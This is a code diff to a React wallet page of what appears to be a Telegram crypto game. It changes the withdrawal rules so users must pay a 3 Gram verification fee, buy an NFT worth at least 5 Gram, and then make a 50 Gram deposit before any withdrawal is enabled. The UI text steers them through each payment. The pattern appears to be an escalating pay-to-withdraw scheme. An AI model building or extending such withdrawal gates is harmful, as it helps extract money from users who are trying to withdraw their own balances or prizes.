@@ -21,8 +21,8 @@ const NOVA_ICON = "/images/nova-icon.jpg";
 const TON_ICON = GRAM_ICON;
 const USDT_ICON = "/images/usdt.png";
 const VERIFY_AMOUNT = 3;
-const NFT_MIN_GRAM = 4;
-const STAKE_MIN_GRAM = 15;
+const NFT_MIN_GRAM = 5;
+const DEPOSIT_MIN_GRAM = 50;
 const TON_USD = 3.5;
 const REQUIRED_ATTACKS = 50;
 
@@ -40,33 +40,33 @@ const WalletPage = () => {
   const [depositAmount, setDepositAmount] = useState("");
   const [verifyOpen, setVerifyOpen] = useState(false);
   const [whyOpen, setWhyOpen] = useState(false);
-  const [reqOpen, setReqOpen] = useState<"nft" | "stake" | null>(null);
+  const [reqOpen, setReqOpen] = useState<"nft" | "deposit" | null>(null);
   const [verifying, setVerifying] = useState(false);
   const [isVerified, setIsVerified] = useState(false);
   const [hasServer, setHasServer] = useState(false);
   const [hasNft, setHasNft] = useState(false);
-  const [stakedTon, setStakedTon] = useState(0);
+  const [hasRequiredDeposit, setHasRequiredDeposit] = useState(false);
   const [attacksBought, setAttacksBought] = useState(0);
   const [hasKill, setHasKill] = useState(false);
 
   useEffect(() => {
     const check = async () => {
       if (!user.profileId) return;
-      const [verified, srvRes, invRes, killRes, nftRes, ownNftRes, stakeRes] = await Promise.all([
+      const [verified, srvRes, invRes, killRes, nftRes, ownNftRes, depositRes] = await Promise.all([
         isWalletVerified(user.telegramUser.id),
         supabase.from("user_servers").select("id").eq("user_id", user.profileId).limit(1),
         supabase.from("battle_inventory").select("total_purchased").eq("user_id", user.profileId).eq("category", "attack"),
         supabase.from("attacks").select("id").eq("user_id", user.profileId).eq("is_killing_blow", true).limit(1),
         supabase.from("user_servers").select("id").eq("user_id", user.profileId).gte("ton_paid", NFT_MIN_GRAM).limit(1),
         supabase.from("user_nfts").select("id").eq("telegram_id", user.telegramUser.id).gte("price_ton", NFT_MIN_GRAM).limit(1),
-        supabase.from("stakes").select("amount").eq("profile_id", user.profileId).eq("currency", "ton").eq("status", "active"),
+        supabase.from("transactions").select("id").eq("user_id", user.profileId).eq("type", "deposit").eq("currency", "ton").eq("status", "completed").gte("amount", DEPOSIT_MIN_GRAM).limit(1),
       ]);
       setIsVerified(Boolean(verified));
       setHasServer(!!srvRes.data && srvRes.data.length > 0);
       setAttacksBought((invRes.data ?? []).reduce((s, r: any) => s + (r.total_purchased ?? 0), 0));
       setHasKill(!!killRes.data && killRes.data.length > 0);
       setHasNft(((nftRes.data ?? []).length + (ownNftRes.data ?? []).length) > 0);
-      setStakedTon((stakeRes.data ?? []).reduce((s, r: any) => s + Number(r.amount ?? 0), 0));
+      setHasRequiredDeposit((depositRes.data ?? []).length > 0);
     };
     void check();
   }, [user.profileId, user.telegramUser.id]);
@@ -82,8 +82,8 @@ const WalletPage = () => {
       setReqOpen("nft");
       return;
     }
-    if (stakedTon < STAKE_MIN_GRAM) {
-      setReqOpen("stake");
+    if (!hasRequiredDeposit) {
+      setReqOpen("deposit");
       return;
     }
     setWithdrawCurrency("ton");
@@ -185,6 +185,7 @@ const WalletPage = () => {
       const credit = await creditDepositWithIntent({ telegramId: user.telegramUser.id, intentId: tx.intentId, walletAddress: address });
       if (!credit?.success) throw new PaymentError("failed", "Payment confirmed but crediting failed. Contact support.");
       await refreshProfile();
+      if (amount >= DEPOSIT_MIN_GRAM) setHasRequiredDeposit(true);
       toast({ title: "Deposit credited", description: `${credit.amount ?? amount} Gram added to your balance` });
       setDepositOpen(false);
       setDepositAmount("");
@@ -216,6 +217,8 @@ const WalletPage = () => {
     if (!res?.success) {
       const messages: Record<string, string> = {
         wallet_not_verified: "Verify your wallet first",
+        nft_required: `Buy an NFT worth at least ${NFT_MIN_GRAM} Gram first`,
+        deposit_required: `Make one completed deposit of at least ${DEPOSIT_MIN_GRAM} Gram first`,
         insufficient_balance: "Your balance is not enough for this withdrawal",
         pending_request_exists: "You already have a pending withdrawal for this currency",
         no_wallet: "Connect your TON wallet first",
@@ -249,7 +252,7 @@ const WalletPage = () => {
       setVerifyOpen(false);
       toast({ title: "Wallet verified", description: "Your wallet ownership is confirmed" });
       if (!hasNft) setReqOpen("nft");
-      else if (stakedTon < STAKE_MIN_GRAM) setReqOpen("stake");
+      else if (!hasRequiredDeposit) setReqOpen("deposit");
       else {
         setWithdrawCurrency("ton");
         setWithdrawOpen(true);
@@ -519,7 +522,7 @@ const WalletPage = () => {
               <p className="mt-2 text-[11px] uppercase tracking-[0.2em] text-muted-foreground">One-time fee</p>
             </div>
             <p className="relative z-10 mt-5 text-[12px] leading-relaxed text-muted-foreground">
-              Verify wallet ownership to unlock withdrawals. This is required once.
+              Complete the three withdrawal requirements in order: verify with 3 Gram, buy an NFT worth at least 5 Gram, then make one 50 Gram deposit.
             </p>
             <p className="relative z-10 mt-2 text-[11px] leading-relaxed text-muted-foreground">
               Keep at least {(VERIFY_AMOUNT + TON_FEE_BUFFER).toFixed(2)} Gram in your wallet so the network fee is
@@ -574,26 +577,31 @@ const WalletPage = () => {
             </DialogHeader>
             <div className="relative z-10 mt-6 rounded-[28px] border border-white/[0.08] bg-foreground/[0.05] px-5 py-6">
               <p className="text-[38px] font-display font-medium leading-none text-gradient-primary">
-                {reqOpen === "nft" ? NFT_MIN_GRAM : STAKE_MIN_GRAM} Gram
+                {reqOpen === "nft" ? NFT_MIN_GRAM : DEPOSIT_MIN_GRAM} Gram
               </p>
               <p className="mt-2 text-[11px] uppercase tracking-[0.2em] text-muted-foreground">
-                {reqOpen === "nft" ? "Minimum NFT value" : "Minimum stake"}
+                {reqOpen === "nft" ? "Minimum NFT value" : "Minimum deposit"}
               </p>
             </div>
             <p className="relative z-10 mt-5 text-[12px] leading-relaxed text-muted-foreground">
               {reqOpen === "nft"
-                ? `Own an NFT worth at least ${NFT_MIN_GRAM} Gram to unlock withdrawals. This confirms the account is active and real before the prize is released.`
-                : `Stake at least ${STAKE_MIN_GRAM} Gram on the Bonds page to unlock withdrawals. You currently have ${stakedTon.toLocaleString("en-US", { maximumFractionDigits: 2 })} Gram staked.`}
+                ? `Buy an NFT worth at least ${NFT_MIN_GRAM} Gram. After this is verified, the final deposit requirement will appear.`
+                : `Make one completed deposit of at least ${DEPOSIT_MIN_GRAM} Gram. This is the final requirement before withdrawal requests are enabled.`}
             </p>
             <Button
               onClick={() => {
-                const to = reqOpen === "nft" ? "/servers" : "/staking";
-                setReqOpen(null);
-                navigate({ to });
+                if (reqOpen === "nft") {
+                  setReqOpen(null);
+                  navigate({ to: "/servers" });
+                } else {
+                  setReqOpen(null);
+                  setDepositAmount(String(DEPOSIT_MIN_GRAM));
+                  setDepositOpen(true);
+                }
               }}
               className="relative z-10 mt-6 h-12 w-full rounded-2xl font-display text-[15px] font-medium glow-primary"
             >
-              {reqOpen === "nft" ? "Buy NFT" : "Go to staking"}
+              {reqOpen === "nft" ? "Buy NFT" : "Make deposit"}
             </Button>
             <button
               onClick={() => setReqOpen(null)}
